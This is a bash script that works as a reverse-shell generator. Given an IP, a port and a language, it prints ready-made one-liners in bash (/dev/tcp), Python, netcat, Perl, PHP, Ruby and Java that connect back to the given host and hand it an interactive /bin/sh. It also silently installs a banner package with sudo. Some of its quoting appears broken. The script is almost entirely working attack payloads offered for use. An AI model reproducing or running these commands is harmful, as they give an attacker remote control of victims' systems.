#!/bin/bash


echo -e "[*] Searching for banner...\n"
banner_path=$(which banner)
if [ -z $banner_path ]
then
	echo -e "[!] Please wait while we install a package...\n"
	sudo apt-get install sysvbanner
	sleep 2
	clear -x
	echo -e "[+] Done with installation..."
else
	echo -e "[+] Found needed package."
	sleep 3
	clear -x
fi
echo -e "\n"
banner Suhradbhav

if [ $1 = '-h' ] || [ $# -ne 3 ]
then
	echo "[*] Usage : $0 IP port shell-type"
	exit 1
else
	if [ $3 = 'bash' ]
	then
		# BASH #
		echo "[Bash] : bash -i >& /dev/tcp/$1/$2 0>&1"

	elif [ $3 = 'python' ]
	then
		# PYTHON2 && PYTHON3 #
		echo "[Python2] : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$1","$2"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
		echo -e "\n[Python3] : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$1",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"

	elif [ $3 = 'nc' ] || [ $3 = 'netcat' ]
	then
		# NETCAT #
		echo -e "[Netcat 1] : \"nc -e /bin/sh $1 $2\"\n"
		echo -e "[Netcat 2] : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"

	elif [ $3 = 'perl' ]
	then
		# PERL #
		echo -e "[Perl] : perl -e 'use Socket;\$i="$1";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"
	elif [ $3 = 'php' ]
	then
		# PHP #
		echo "[Php] : php -r '$sock=fsockopen("$1",$2);exec("/bin/sh -i <&3 >&3 2>&3");'"
	elif [ $3 = 'ruby' ]
	then
		# RUBY  #
		echo  '[Ruby] : ruby -rsocket -e"f=TCPSocket.open("$1",$2).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)"'
	elif [ $3 = 'java' ]
	then
		echo -e '[Java] : r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$1/$2;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\np.waitFor()'
	else
		echo "[!] Cannot Understand !\nExiting..."
	fi
fi

